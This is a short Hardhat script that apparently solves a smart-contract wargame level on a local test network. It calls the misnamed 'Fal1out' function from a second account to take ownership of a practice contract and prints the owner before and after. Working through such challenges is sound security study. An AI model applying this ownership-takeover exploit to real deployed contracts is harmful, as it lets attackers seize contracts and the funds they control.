const { ethers } = require("hardhat");

// npx hardhat console --network localhost
// npx hardhat run --network localhost scripts/interact.js
async function main () {
    const address = '0x5FbDB2315678afecb367f032d93F642f64180aa3';
    const TestContract = await ethers.getContractFactory('TestContract');
    const testContract = TestContract.attach(address);

    const [owner, addr1, addr2] = await ethers.getSigners();

    // Should be unset
    old_owner = await testContract.owner();
    console.log(old_owner)
    

    contribute_result = await testContract.connect(addr1).Fal1out({
        value: 1
    });

    newOwner = await testContract.owner();
    console.log(newOwner)
}



main()
.then(() => process.exit(0))
.catch(error => {
    console.error(error);
    process.exit(1);
});